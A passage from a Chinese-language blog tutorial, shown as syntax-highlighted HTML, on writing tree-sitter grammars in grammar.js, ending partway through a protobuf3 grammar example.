&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="nx">module&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exports&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">grammar&lt;/span>&lt;span class="p">({&lt;/span>
&lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;hello&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">rules&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">source_file&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">$&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">word&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// 非终结符，0或更多的 word
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">word&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">$&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="sr">/ /&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="nx">非常简单的终结符&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">表示一个词&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以是数字字母下划线组成&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再写一个 test.txt 作为输入&lt;/p>
&lt;pre>&lt;code>amazing tree sitter
&lt;/code>&lt;/pre>&lt;p>最后运行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">npm run &lt;span class="nb">test&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出结果&lt;/p>
&lt;pre>&lt;code>
&amp;gt; tree-sitter-hello@0.1.0 test
&amp;gt; tree-sitter generate &amp;amp;&amp;amp; tree-sitter parse test.txt
(source_file [0, 0] - [1, 0]
(word [0, 0] - [0, 7])
(word [0, 8] - [0, 12])
(word [0, 13] - [0, 19]))
&lt;/code>&lt;/pre>&lt;p>就是这样！&lt;/p>
&lt;h2 id="规则-dsl">规则 DSL&lt;/h2>
&lt;p>所有规则都用这种格式编写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="nx">rule_name1&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">$&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">terminal&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">symbol&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">rule_name2&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">$&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;non&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;terminal&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;symbol&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>正则表达式或字符串表示终结符，规则函数表示非终结符（token函数是例外）&lt;/p>
&lt;p>一些函数来标识 ENBF 里出现的规则：&lt;/p>
&lt;ul>
&lt;li>&lt;code>repeat&lt;/code> 就是重复0或多次，类似 EBNF 的 &lt;code>{ }&lt;/code> 含义&lt;/li>
&lt;li>&lt;code>repeat1&lt;/code> 至少出现一次，可以重复多次，类似 EBNF 的 &lt;code> SYM { SYM }&lt;/code> 这样的形式&lt;/li>
&lt;li>&lt;code>optional&lt;/code> 可选，类似 EBNF 的 &lt;code>[ ]&lt;/code> 含义&lt;/li>
&lt;li>&lt;code>choice&lt;/code> 多选一，类似 EBNF 的 &lt;code>|&lt;/code> 含义&lt;/li>
&lt;li>&lt;code>seq&lt;/code> 序列，表示前后顺序，在 EBNF 里就是符号出现的顺序&lt;/li>
&lt;li>&lt;code>token&lt;/code> ，把一个复杂规则合并成一个 token，一般是难以用一个正则表达式解决的终结符会用 &lt;code>token(choice(/hex/,/octal/,/decimals/))&lt;/code> 这种形式编写。&lt;/li>
&lt;/ul>
&lt;p>还有其他的，用于设置左右联结性优先级什么的，就不多介绍了。可以自己看tree-sitter的文档。&lt;/p>
&lt;h2 id="更复杂一点的例子">更复杂一点的例子&lt;/h2>
&lt;p>贴一个参考 protocol buffer 3 的 spec 写出来的 grammar.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="nx">module&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exports&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">grammar&lt;/span>&lt;span class="p">({&lt;/span>
&lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;protobuf&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">extras&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/\s/&lt;/span>&lt;span class="p">],&lt;/span>
&lt;span class="nx">rules&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// top
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">source_file&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">syntax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">import&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">package&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">option&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">emptyStatement&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">enum&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">service&lt;/span>&lt;span class="p">))),&lt;/span>
&lt;span class="c1">// comment
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">comment&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">token&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;//&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/.*/&lt;/span>&lt;span class="p">)),&lt;/span>
&lt;span class="c1">// syntax
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">syntax&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;syntax&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sr">/&amp;#34;proto3&amp;#34;/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// package
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">package&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;package&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fullIdent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// imports
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">import&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;import&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">strLit&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// option
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">option&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;option&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">optionName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constant&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">optionName&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fullIdent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fullIdent&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// enum
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">enum&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;enum&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumBody&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">enumBody&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;{&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">option&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">emptyStatement&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;}&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">enumField&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ident&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">intLit&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumValueOption&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumValueOption&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="p">)),&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="nx">enumValueOption&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">optionName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constant&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// message
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">message&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">messageName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">messageBody&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">messageBody&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;{&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">field&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">enum&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">option&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">oneof&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mapField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">reserved&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">emptyStatement&lt;/span>&lt;span class="p">)),&lt;/span>
&lt;span class="s1">&amp;#39;}&amp;#39;&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="c1">// service
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">service&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;service&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">serviceName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;{&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">option&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rpc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">emptyStatement&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;}&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">rpc&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;rpc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rpcName&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;stream&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumMessageType&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;returns&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;stream&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">enumMessageType&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;{&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">option&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">emptyStatement&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;}&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="c1">// field and inline option
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">field&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;repeated&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldNumber&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldOptions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">fieldOptions&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldOption&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;,&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldOption&lt;/span>&lt;span class="p">))),&lt;/span>
&lt;span class="nx">fieldOption&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">optionName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constant&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// oneof
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">oneof&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;oneof&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">oneofName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;{&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">repeat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">option&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">oneofField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">emptyStatement&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;}&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="nx">oneofField&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldNumber&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">optional&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">$&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fieldOptions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// map
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">mapField&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">$&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span>
&lt;span class="nx">seq&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;map&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
